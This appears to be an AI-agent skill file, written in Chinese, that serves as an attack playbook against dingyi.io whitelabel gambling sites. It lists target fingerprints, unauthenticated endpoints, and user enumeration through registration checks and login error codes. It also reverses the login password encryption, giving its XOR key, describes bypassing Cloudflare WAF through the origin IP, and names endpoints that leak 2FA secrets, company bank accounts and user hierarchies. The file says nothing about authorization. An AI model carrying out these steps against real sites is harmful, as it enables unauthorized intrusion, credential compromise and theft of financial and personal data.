---
name: 商心慈·鼎艺
description: "Use when target is a dingyi.io whitelabel gambling site."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, gambling, whitelabel, dingyi]
    category: daaixianzun
---

> **商心慈**
> 心慈不是心手软，账清才能走得远。
> 千门白标同一宗，认族先问商家钱。

# dingyi.io 白标博彩打站手册

## 触发指纹
- Nuxt 前端 + `webSdk.produce.min.3.x.x.js` + `/api/core/{member|finance|system}/frontend/*` API 结构
- 响应头 `X-Cache: MISS from megagw-cdnb55-023`(megagw CDN);NS 或子域解析到 `*.wcdnga.com`
- 域名特征: `cdn.<rand>.com` 样式 S3 CDN、`sso.<rand>.com` 第三方登录确认页、泰语默认
- entry.js 内含 `VITE_API_BASE:"/api"`、dev 环境 `66001-dev.dingyi.io/api`

## 侦察
1. 抓 `/_nuxt/entry-index-*.js` → grep `"/core/...frontend/..."` 得全 API 清单;grep `https://` 得平台域名
2. 平台其他域: `sso.*.com`(Login Confirm 页, 标准 OAuth 无洞)、`analytics.dingyi.io`、`stage-lb.dingyi.io`
3. 未授权直通接口(无需 token):
   - `/api/core/system/frontend/support-locale-setting/get`
   - `/api/core/member/frontend/member-config/get` → siteId / 验证码开关 / 登录步进配置
   - `/api/core/system/frontend/user-comments/get`、`/api/core/server/echo`

## 注册(最快入口, 必先做)
- `POST /api/core/member/frontend/register` body=`{"account","password","registerDomain":"https://<site>/"}` — **明文密码, 无验证码, 无速率限制, 注册即返回 token(注册即登录)**
- 用户 id 连续(可估算站规模);token 直接作 `Authorization: Bearer` 用
- 用户枚举: `registeration-data/verify {"account":X}` → `isAccountDuplicate:true` = 账号存在

## 登录链 + 加密逆向(登录受滑块保护)
1. `POST /login/verify-key/get` → `{random, array[4], digit}`
2. `verifyKey = floor(random*10^digit) + array[1]+array[3]-array[0]-array[2]`
3. `POST /login/verify {"verifyKey":g}` → 200
4. `POST /login {"agentId","account","password":Xe(pwd),"deviceId"}`
5. 密码加密 Xe: `p=ord(pwd[0])`;逐字符 XOR `Je[(i+p)%32]`,`Je="d1b9e55a0df3a62684167da5dd7a7fea"`;拼接 `xor + p + len(str(p))` → base64
6. 脚本: `scripts/dingyi_login.py <base> <account> <password>`

## 登录错误码审计(用户枚举+类型区分)
| code | 含义 |
|---|---|
| 40000 | 用户不存在 |
| 20000 Unauthorized | 账号存在但代理/员工被禁前端登录(如 `msg389boss` 顶级总代理) |
| 40004 | 密码错误(需过滑块才到密码校验) |
| 50001 | 频率限制(等 N 秒) |
| 50006 | 验证失败(参数/格式) |

## CF 绕过
- 直连源站 IP(多为 SKYCLOUD 台湾)带 `Host: <domain>` 头, 绕 CF WAF/限流;TLS 需忽略证书
- 源站端口仅 80/443/8443(8443 也是 megagw CDN 节点)

## 认证后高价值接口
- `google-secret/get` → 无鉴权返回 TOTP otpauth URL(2FA secret)
- `pay-channel/info` → **公司收款银行户名/卡号**、第三方网关(WINPAY)、渠道 id(如 6924 CARD / 6926 SCAN)
- `bank/get{currency}`、`chain-type/get`、`currency-info/list`、`currency-exchange/info`(汇率)
- `account-up-hierarchy/get {"account":X}` → 用户层级 `{id,account,superior,level}` 泄露(顶级 id=1)
- `agent-code/list` → 用户自带代理码

## 充值/提现/绑卡(前置门槛, 常卡住)
- 充值/提现/转账都要求: 绑金融账户(KYC event 9 银行卡 或 digital-wallet USDT) + 提现密码 + 充值凭证上传
- `deposit/apply` 参数 `{amount, payChannelId}` multipart;报 "Missing Servlet Request Parameter" = 服务端 `@RequestParam`, 需 query/multipart 而非 JSON
- `digital-wallet/v2/add` multipart, `chainType` 需枚举值(int, 传字符串报 Type Mismatch)
- `withdrawal-code/update` 参数名反直觉(试 `code/confirm` 仍报 blank)—— 从设置弹窗 chunk 逆向或浏览器抓包, 别瞎猜
- 浏览器 UI 绑卡流程易被客户端校验拦截;**拿到端点后立刻转 API 层**, 别在 UI 上耗

## 坑
- SPA fallback: 任意路径 200 且 body == index.html;验证 `curl -o a.txt path; cmp a.txt index.html`
- 浏览器 fetch/XHR hook **刷新后失效** — 每次 reload 后要重新注入;axios 可能走 SW
- 注册成功信号: localStorage `user.token` + `isLogin:true`;可用注册返回 token 直接打 API, 不必过登录滑块
- 滑块验证 `img-verification/slider/get {"authCodeKey":ts+rand}` → `{bigImage,smallImage,yHeight}`;`verify {"authCodeKey","code"}` — 纯自动爆破需图像识别缺口
- 同平台白标租户多(66001-dev 等), 找同族站换更弱配置

## 交付
证据落 `evidence/<date>-<target>/`, 发现表(见 pentest-workflow)命中即切对应 skill。